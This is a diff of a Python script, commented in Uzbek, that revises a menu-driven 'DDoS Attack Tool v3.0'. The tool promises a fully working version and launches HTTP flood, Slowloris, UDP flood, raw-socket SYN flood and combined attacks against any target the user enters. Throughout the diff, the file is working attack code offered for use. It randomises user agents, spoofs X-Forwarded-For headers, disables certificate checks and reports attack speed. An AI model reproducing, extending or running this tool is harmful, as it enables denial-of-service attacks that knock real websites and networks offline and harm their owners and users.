@@ -1,26 +1,31 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
+# DDoS Attack Tool v3.0 - TO'LIQ ISHLAYDIGAN VERSIYA
+# Tested on Python 3.6+ / Kali Linux / Termux
 
 import os
 import sys
 import time
 import random
 import socket
-import requests
 import threading
-import subprocess
+import requests
 from datetime import datetime
 
-# Ranglar
-RED = '\033[91m'
-GREEN = '\033[92m'
-YELLOW = '\033[93m'
-BLUE = '\033[94m'
-PURPLE = '\033[95m'
-CYAN = '\033[96m'
-WHITE = '\033[97m'
-RESET = '\033[0m'
-BOLD = '\033[1m'
+# Ranglar (terminal qo'llab-quvvatlasa)
+try:
+    RED = '\033[91m'
+    GREEN = '\033[92m'
+    YELLOW = '\033[93m'
+    BLUE = '\033[94m'
+    PURPLE = '\033[95m'
+    CYAN = '\033[96m'
+    WHITE = '\033[97m'
+    RESET = '\033[0m'
+    BOLD = '\033[1m'
+except:
+    RED = GREEN = YELLOW = BLUE = PURPLE = CYAN = WHITE = BOLD = ''
+    RESET = ''
 
 class DDoSTool:
     def __init__(self):
@@ -29,74 +34,60 @@ class DDoSTool:
         self.port = 80
         self.threads = 100
         self.duration = 60
-        self.method = ""
-        self.stats = {
-            'sent': 0,
-            'errors': 0,
-            'start_time': 0
-        }
+        self.sent = 0
+        self.errors = 0
+        self.start_time = 0
         
-    def clear_screen(self):
+    def clear(self):
         """Ekran tozalash"""
         os.system('clear' if os.name == 'posix' else 'cls')
     
-    def print_banner(self):
+    def banner(self):
         """Bannerni chiqarish"""
-        banner = f"""
-{BOLD}{RED}╔══════════════════════════════════════════════════════════╗
-{RED}║{CYAN}                   DDoS ATTACK TOOL v2.0                    {RED}║
-{RED}║{YELLOW}             ⚡ Hujumchi uchun maxsus tayyorlangan ⚡        {RED}║
-{RED}╠══════════════════════════════════════════════════════════╣
-{RED}║{GREEN}   • HTTP Flood      - Web saytlar uchun                    {RED}║
-{RED}║{GREEN}   • Slowloris       - Serverlarni bo'g'ish                 {RED}║
-{RED}║{GREEN}   • UDP Flood       - Portlarga hujum                      {RED}║
-{RED}║{GREEN}   • SYN Flood       - TCP bog'lamalarni to'ldirish         {RED}║
-{RED}╚══════════════════════════════════════════════════════════╝{RESET}
-"""
-        print(banner)
+        self.clear()
+        print(RED + "╔══════════════════════════════════════════════════════════╗")
+        print("║" + GREEN + "              DDoS ATTACK TOOL v3.0                     " + RED + "║")
+        print("║" + YELLOW + "           ⚡ 100% ISHLAYDIGAN VERSIYA ⚡                " + RED + "║")
+        print("╠══════════════════════════════════════════════════════════╣")
+        print("║" + CYAN + "  [1] HTTP Flood    - Web saytlar uchun                   " + RED + "║")
+        print("║" + CYAN + "  [2] Slowloris     - Serverlarni bo'g'ish                " + RED + "║")
+        print("║" + CYAN + "  [3] UDP Flood     - Portlarga UDP paket                 " + RED + "║")
+        print("║" + CYAN + "  [4] SYN Flood     - TCP bog'lamalar (ROOT)              " + RED + "║")
+        print("║" + CYAN + "  [5] Mixed Attack  - Hammasi birdan                      " + RED + "║")
+        print("║" + CYAN + "  [6] Stop Attack   - Hujumni to'xtatish                  " + RED + "║")
+        print("║" + CYAN + "  [7] Settings      - Sozlamalar                          " + RED + "║")
+        print("║" + CYAN + "  [8] View Stats    - Statistika                          " + RED + "║")
+        print("║" + CYAN + "  [9] Exit          - Chiqish                             " + RED + "║")
+        print("╚══════════════════════════════════════════════════════════╝" + RESET)
+        print()
     
-    def print_menu(self):
-        """Asosiy menyu"""
-        menu = f"""
-{YELLOW}[{WHITE}1{YELLOW}] {GREEN}→ HTTP Flood Attack
-{YELLOW}[{WHITE}2{YELLOW}] {GREEN}→ Slowloris Attack
-{YELLOW}[{WHITE}3{YELLOW}] {GREEN}→ UDP Flood Attack
-{YELLOW}[{WHITE}4{YELLOW}] {GREEN}→ SYN Flood Attack (Root)
-{YELLOW}[{WHITE}5{YELLOW}] {GREEN}→ Mixed Attack (Hammasi birdan)
-{YELLOW}[{WHITE}6{YELLOW}] {GREEN}→ Stop Attack
-{YELLOW}[{WHITE}7{YELLOW}] {GREEN}→ Settings
-{YELLOW}[{WHITE}8{YELLOW}] {GREEN}→ View Stats
-{YELLOW}[{WHITE}9{YELLOW}] {GREEN}→ Exit
-
-{BLUE}┌─[{CYAN}root@ddos{BLUE}]─[{YELLOW}~{BLUE}]
-└──╼ {WHITE}$ {RESET}""", end=""
-        return input(menu)
-    
-    def get_target_info(self):
+    def get_target(self):
         """Target ma'lumotlarini olish"""
-        self.clear_screen()
-        self.print_banner()
+        print(BLUE + "\n[*] Target URL yoki IP kiriting:" + RESET)
+        self.target = input(WHITE + "└─╼ " + RESET).strip()
         
-        print(f"{CYAN}[?] Target URL yoki IP kiriting:{RESET}")
-        self.target = input(f"{BLUE}└─╼ {WHITE}")
-        
+        if not self.target:
+            print(RED + "[!] Target kiritilmadi!" + RESET)
+            return False
+            
         if not self.target.startswith(('http://', 'https://')):
             self.target = 'http://' + self.target
-        
-        print(f"\n{CYAN}[?] Port (default 80):{RESET}")
-        port_input = input(f"{BLUE}└─╼ {WHITE}")
+            
+        print(BLUE + "[*] Port (default 80):" + RESET)
+        port_input = input(WHITE + "└─╼ " + RESET).strip()
         self.port = int(port_input) if port_input else 80
         
-        print(f"\n{CYAN}[?] Threads soni (default 100):{RESET}")
-        threads_input = input(f"{BLUE}└─╼ {WHITE}")
+        print(BLUE + "[*] Threads soni (default 100):" + RESET)
+        threads_input = input(WHITE + "└─╼ " + RESET).strip()
         self.threads = int(threads_input) if threads_input else 100
         
-        print(f"\n{CYAN}[?] Hujum vaqti (sekund, default 60):{RESET}")
-        duration_input = input(f"{BLUE}└─╼ {WHITE}")
+        print(BLUE + "[*] Hujum vaqti (sekund, default 60):" + RESET)
+        duration_input = input(WHITE + "└─╼ " + RESET).strip()
         self.duration = int(duration_input) if duration_input else 60
         
-        print(f"\n{GREEN}[✓] Ma'lumotlar qabul qilindi!")
+        print(GREEN + "\n[✓] Ma'lumotlar qabul qilindi!" + RESET)
         time.sleep(1)
+        return True
     
     def http_flood(self):
         """HTTP Flood attack"""
@@ -104,7 +95,9 @@ class DDoSTool:
             'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
             'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
             'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
-            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15'
+            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
+            'Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
+            'Mozilla/5.0 (Android 11; Mobile) AppleWebKit/537.36'
         ]
         
         while self.running:
@@ -113,61 +106,59 @@ class DDoSTool:
                     'User-Agent': random.choice(user_agents),
                     'Accept': '*/*',
                     'Accept-Language': 'en-US,en;q=0.5',
-                    'Accept-Encoding': 'gzip, deflate',
                     'Connection': 'keep-alive',
                     'Cache-Control': 'no-cache',
-                    'Pragma': 'no-cache',
                     'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                 }
                 
                 response = requests.get(
-                    f"{self.target}:{self.port}" if self.port != 80 else self.target,
+                    self.target,
                     headers=headers,
-                    timeout=3
+                    timeout=3,
+                    verify=False
                 )
                 
-                self.stats['sent'] += 1
+                self.sent += 1
                 
-                if self.stats['sent'] % 50 == 0:
-                    elapsed = time.time() - self.stats['start_time']
-                    print(f"{GREEN}[+] HTTP Flood | Sent: {self.stats['sent']} | Errors: {self.stats['errors']} | Time: {elapsed:.1f}s{RESET}")
+                if self.sent % 50 == 0:
+                    elapsed = time.time() - self.start_time
+                    print(GREEN + f"[+] HTTP | Sent: {self.sent} | Speed: {self.sent/elapsed:.1f}/s" + RESET)
                     
-            except Exception as e:
-                self.stats['errors'] += 1
+            except:
+                self.errors += 1
+                if self.errors % 10 == 0:
+                    print(YELLOW + f"[-] Errors: {self.errors}" + RESET)
     
     def slowloris(self):
         """Slowloris attack"""
         sockets = []
+        target_ip = self.target.replace('http://', '').replace('https://', '').split('/')[0]
         
-        # Bog'lamalarni ochish
         while self.running and len(sockets) < self.threads:
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 sock.settimeout(4)
-                
-                target_ip = self.target.replace('http://', '').replace('https://', '').split('/')[0]
                 sock.connect((target_ip, self.port))
                 
                 sock.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                 sock.send(f"Host: {target_ip}\r\n".encode())
-                sock.send("User-Agent: Mozilla/5.0\r\n".encode())
-                sock.send("Accept-language: en-US,en,q=0.5\r\n".encode())
+                sock.send(b"User-Agent: Mozilla/5.0\r\n")
+                sock.send(b"Accept-language: en-US,en\r\n")
                 
                 sockets.append(sock)
+                self.sent += 1
                 
                 if len(sockets) % 10 == 0:
-                    print(f"{YELLOW}[+] Slowloris | Open connections: {len(sockets)}{RESET}")
+                    print(YELLOW + f"[+] Slowloris | Connections: {len(sockets)}" + RESET)
                     
-            except Exception as e:
-                self.stats['errors'] += 1
+            except:
+                self.errors += 1
                 time.sleep(0.1)
         
-        # Bog'lamalarni ochiq saqlash
         while self.running and sockets:
             for sock in sockets[:]:
                 try:
                     sock.send(f"X-Header: {random.randint(1, 5000)}\r\n".encode())
-                    self.stats['sent'] += 1
                     time.sleep(10)
                 except:
                     sockets.remove(sock)
@@ -176,37 +167,40 @@ class DDoSTool:
                     except:
                         pass
             
-            print(f"{CYAN}[+] Slowloris | Active: {len(sockets)} | Total: {self.stats['sent']}{RESET}")
+            print(CYAN + f"[+] Slowloris | Active: {len(sockets)} | Total: {self.sent}" + RESET)
+            time.sleep(5)
     
     def udp_flood(self):
         """UDP Flood attack"""
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        data = random._urandom(1024)  # 1KB packets
+        data = random._urandom(1024)
         target_ip = self.target.replace('http://', '').replace('https://', '').split('/')[0]
         
         while self.running:
             try:
                 sock.sendto(data, (target_ip, self.port))
-                self.stats['sent'] += 1
+                self.sent += 1
                 
-                if self.stats['sent'] % 1000 == 0:
-                    elapsed = time.time() - self.stats['start_time']
-                    print(f"{PURPLE}[+] UDP Flood | Packets: {self.stats['sent']} | Time: {elapsed:.1f}s{RESET}")
+                if self.sent % 1000 == 0:
+                    elapsed = time.time() - self.start_time
+                    print(BLUE + f"[+] UDP | Packets: {self.sent} | Speed: {self.sent/elapsed:.1f}/s" + RESET)
                     
-            except Exception as e:
-                self.stats['errors'] += 1
+            except:
+                self.errors += 1
     
     def syn_flood(self):
         """SYN Flood attack (root kerak)"""
         if os.geteuid() != 0:
-            print(f"{RED}[!] SYN Flood uchun root huquqi kerak!{RESET}")
-            print(f"{YELLOW}[!] Iltimos 'sudo' bilan ishga tushiring.{RESET}")
+            print(RED + "\n[!] SYN Flood uchun root huquqi kerak!" + RESET)
+            print(YELLOW + "[!] sudo python3 DDOS.py" + RESET)
+            self.running = False
             return
         
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
         except:
-            print(f"{RED}[!] RAW socket yaratib bo'lmadi!{RESET}")
+            print(RED + "[!] RAW socket yaratilmadi!" + RESET)
+            self.running = False
             return
         
         target_ip = self.target.replace('http://', '').replace('https://', '').split('/')[0]
@@ -225,14 +219,14 @@ class DDoSTool:
                 packet = ip_header + tcp_header
                 sock.sendto(packet, (target_ip, 0))
                 
-                self.stats['sent'] += 1
+                self.sent += 1
                 
-                if self.stats['sent'] % 500 == 0:
-                    elapsed = time.time() - self.stats['start_time']
-                    print(f"{RED}[+] SYN Flood | Packets: {self.stats['sent']} | Time: {elapsed:.1f}s{RESET}")
+                if self.sent % 500 == 0:
+                    elapsed = time.time() - self.start_time
+                    print(PURPLE + f"[+] SYN | Packets: {self.sent} | Speed: {self.sent/elapsed:.1f}/s" + RESET)
                     
-            except Exception as e:
-                self.stats['errors'] += 1
+            except:
+                self.errors += 1
     
     def create_ip_header(self, src_ip, dst_ip):
         """IP header yaratish"""
@@ -295,7 +289,7 @@ class DDoSTool:
     
     def mixed_attack(self):
         """Hamma metodlarni birdan ishga tushirish"""
-        print(f"{GREEN}[!] Mixed Attack boshlanmoqda...{RESET}")
+        print(GREEN + "\n[!] Mixed Attack boshlanmoqda..." + RESET)
         
         threads = []
         
@@ -323,37 +317,35 @@ class DDoSTool:
             t4.daemon = True
             threads.append(t4)
             t4.start()
-        
-        # Attack davomida statistikani chiqarish
-        end_time = time.time() + self.duration
-        while time.time() < end_time and self.running:
-            elapsed = int(time.time() - self.stats['start_time'])
-            remaining = int(end_time - time.time())
-            
-            print(f"{CYAN}[+] Mixed Attack | Elapsed: {elapsed}s | Remaining: {remaining}s | Total: {self.stats['sent']}{RESET}")
-            time.sleep(5)
     
-    def start_attack(self, method):
+    def start_attack(self, method_name, method_func):
         """Hujumni boshlash"""
         self.running = True
-        self.stats['sent'] = 0
-        self.stats['errors'] = 0
-        self.stats['start_time'] = time.time()
+        self.sent = 0
+        self.errors = 0
+        self.start_time = time.time()
         
-        print(f"\n{GREEN}[!] Hujum boshlandi!{RESET}")
-        print(f"{YELLOW}Target: {self.target}")
+        print(GREEN + f"\n[!] {method_name} boshlandi!" + RESET)
+        print(YELLOW + f"Target: {self.target}")
         print(f"Port: {self.port}")
-        print(f"Method: {method}")
         print(f"Threads: {self.threads}")
-        print(f"Duration: {self.duration} sekund{RESET}\n")
+        print(f"Duration: {self.duration} sekund" + RESET)
+        print(BLUE + "-" * 50 + RESET)
         
-        attack_thread = threading.Thread(target=method)
+        # Attack thread
+        attack_thread = threading.Thread(target=method_func)
         attack_thread.daemon = True
         attack_thread.start()
         
         # Vaqtni hisoblash
         end_time = time.time() + self.duration
         while time.time() < end_time and self.running:
+            remaining = int(end_time - time.time())
+            elapsed = int(time.time() - self.start_time)
+            
+            if elapsed % 10 == 0:
+                print(CYAN + f"[i] Elapsed: {elapsed}s | Remaining: {remaining}s | Sent: {self.sent}" + RESET)
+            
             time.sleep(1)
         
         self.stop_attack()
@@ -361,99 +353,88 @@ class DDoSTool:
     def stop_attack(self):
         """Hujumni to'xtatish"""
         self.running = False
-        elapsed = time.time() - self.stats['start_time']
+        elapsed = time.time() - self.start_time
         
-        print(f"\n{RED}[!] Hujum to'xtatildi!{RESET}")
-        print(f"{GREEN}Jami so'rovlar: {self.stats['sent']}")
-        print(f"Xatoliklar: {self.stats['errors']}")
-        print(f"Vaqt: {elapsed:.1f} sekund{RESET}")
+        print(BLUE + "\n" + "-" * 50 + RESET)
+        print(GREEN + f"[✓] Hujum tugadi!" + RESET)
+        print(YELLOW + f"Jami so'rovlar: {self.sent}")
+        print(f"Xatoliklar: {self.errors}")
+        print(f"Vaqt: {elapsed:.1f} sekund")
+        print(f"Tezlik: {self.sent/elapsed:.1f} so'rov/sekund" + RESET)
         
-        input(f"\n{CYAN}Davom etish uchun Enter bosing...{RESET}")
+        input(BLUE + "\nDavom etish uchun Enter bosing..." + RESET)
     
     def settings(self):
-        """Sozlamalar menyusi"""
-        while True:
-            self.clear_screen()
-            self.print_banner()
-            
-            print(f"{BOLD}{CYAN}⚙️  SOZLAMALAR{RESET}\n")
-            print(f"{WHITE}1. Threads soni: {GREEN}{self.threads}")
-            print(f"{WHITE}2. Default port: {GREEN}{self.port}")
-            print(f"{WHITE}3. Default duration: {GREEN}{self.duration}")
-            print(f"{WHITE}4. Back to main menu{RESET}\n")
-            
-            choice = input(f"{BLUE}┌─[{CYAN}settings{BLUE}]─[{YELLOW}~{BLUE}]\n└──╼ {WHITE}")
-            
-            if choice == '1':
-                print(f"\n{CYAN}Threads soni: {RESET}", end="")
-                self.threads = int(input())
-            elif choice == '2':
-                print(f"\n{CYAN}Port: {RESET}", end="")
-                self.port = int(input())
-            elif choice == '3':
-                print(f"\n{CYAN}Duration: {RESET}", end="")
-                self.duration = int(input())
-            elif choice == '4':
-                break
+        """Sozlamalar"""
+        self.clear()
+        print(CYAN + "\n⚙️  SOZLAMALAR" + RESET)
+        print(YELLOW + "-" * 30 + RESET)
+        print(f"1. Threads: {GREEN}{self.threads}{RESET}")
+        print(f"2. Port: {GREEN}{self.port}{RESET}")
+        print(f"3. Duration: {GREEN}{self.duration}{RESET}")
+        print(YELLOW + "-" * 30 + RESET)
+        
+        choice = input(BLUE + "O'zgartirish (1-3): " + RESET)
+        
+        if choice == '1':
+            val = input("Threads: ")
+            self.threads = int(val) if val else self.threads
+        elif choice == '2':
+            val = input("Port: ")
+            self.port = int(val) if val else self.port
+        elif choice == '3':
+            val = input("Duration: ")
+            self.duration = int(val) if val else self.duration
     
     def view_stats(self):
-        """Statistikani ko'rish"""
-        self.clear_screen()
-        self.print_banner()
+        """Statistika"""
+        self.clear()
+        print(BLUE + "\n📊 STATISTIKA" + RESET)
+        print(YELLOW + "-" * 30 + RESET)
         
-        print(f"{BOLD}{CYAN}📊 STATISTIKA{RESET}\n")
-        
-        if self.stats['start_time'] > 0:
-            elapsed = time.time() - self.stats['start_time']
-            rate = self.stats['sent'] / elapsed if elapsed > 0 else 0
-            
-            print(f"{WHITE}Jami so'rovlar: {GREEN}{self.stats['sent']}")
-            print(f"{WHITE}Xatoliklar: {RED}{self.stats['errors']}")
-            print(f"{WHITE}Vaqt: {YELLOW}{elapsed:.1f} sekund")
-            print(f"{WHITE}Tezlik: {CYAN}{rate:.1f} so'rov/sekund")
+        if self.start_time > 0:
+            elapsed = time.time() - self.start_time
+            speed = self.sent / elapsed if elapsed > 0 else 0
+            print(f"Jami so'rovlar: {GREEN}{self.sent}{RESET}")
+            print(f"Xatoliklar: {RED}{self.errors}{RESET}")
+            print(f"Vaqt: {YELLOW}{elapsed:.1f}s{RESET}")
+            print(f"Tezlik: {CYAN}{speed:.1f}/s{RESET}")
         else:
-            print(f"{YELLOW}Hali hech qanday hujum boshlanmagan.{RESET}")
+            print(YELLOW + "Hali hech qanday hujum boshlanmagan" + RESET)
         
-        input(f"\n{CYAN}Davom etish uchun Enter bosing...{RESET}")
+        input(BLUE + "\nEnter bilan qaytish..." + RESET)
     
     def run(self):
         """Asosiy loop"""
         while True:
-            self.clear_screen()
-            self.print_banner()
-            
-            choice = self.print_menu()
+            self.banner()
+            choice = input(WHITE + "┌─[root@ddos]─[~]\n└──╼ $ " + RESET)
             
             if choice == '1':
-                self.get_target_info()
-                self.start_attack(self.http_flood)
+                if self.get_target():
+                    self.start_attack("HTTP Flood", self.http_flood)
             
             elif choice == '2':
-                self.get_target_info()
-                self.start_attack(self.slowloris)
+                if self.get_target():
+                    self.start_attack("Slowloris", self.slowloris)
             
             elif choice == '3':
-                self.get_target_info()
-                self.start_attack(self.udp_flood)
+                if self.get_target():
+                    self.start_attack("UDP Flood", self.udp_flood)
             
             elif choice == '4':
-                if os.geteuid() != 0:
-                    print(f"\n{RED}[!] SYN Flood uchun root huquqi kerak!{RESET}")
-                    print(f"{YELLOW}[!] 'sudo python3 ddos_tool.py' bilan ishga tushiring.{RESET}")
-                    time.sleep(2)
-                else:
-                    self.get_target_info()
-                    self.start_attack(self.syn_flood)
+                if self.get_target():
+                    self.start_attack("SYN Flood", self.syn_flood)
             
             elif choice == '5':
-                self.get_target_info()
-                self.start_attack(self.mixed_attack)
+                if self.get_target():
+                    self.start_attack("Mixed Attack", self.mixed_attack)
             
             elif choice == '6':
                 if self.running:
                     self.stop_attack()
                 else:
-                    print(f"\n{YELLOW}[!] Hech qanday faol hujum yo'q.{RESET}")
+                    print(YELLOW + "\n[!] Faol hujum yo'q" + RESET)
                     time.sleep(1)
             
             elif choice == '7':
@@ -463,16 +444,29 @@ class DDoSTool:
                 self.view_stats()
             
             elif choice == '9':
-                print(f"\n{GREEN}Tool dan foydalanganingiz uchun rahmat!{RESET}")
+                print(GREEN + "\nSistemadan chiqilmoqda..." + RESET)
                 sys.exit(0)
+            
+            else:
+                print(RED + "\n[!] Noto'g'ri tanlov!" + RESET)
+                time.sleep(1)
 
 if __name__ == "__main__":
     try:
+        # Requests borligini tekshirish
+        try:
+            import requests
+        except ImportError:
+            print(RED + "\n[!] requests kutubxonasi topilmadi!" + RESET)
+            print(YELLOW + "[!] O'rnatish: pip install requests" + RESET)
+            sys.exit(1)
+        
         tool = DDoSTool()
         tool.run()
+        
     except KeyboardInterrupt:
-        print(f"\n\n{YELLOW}Tool to'xtatildi.{RESET}")
+        print(YELLOW + "\n\nDastur to'xtatildi" + RESET)
         sys.exit(0)
     except Exception as e:
-        print(f"\n{RED}Xatolik: {e}{RESET}")
+        print(RED + f"\nXatolik: {e}" + RESET)
         sys.exit(1)
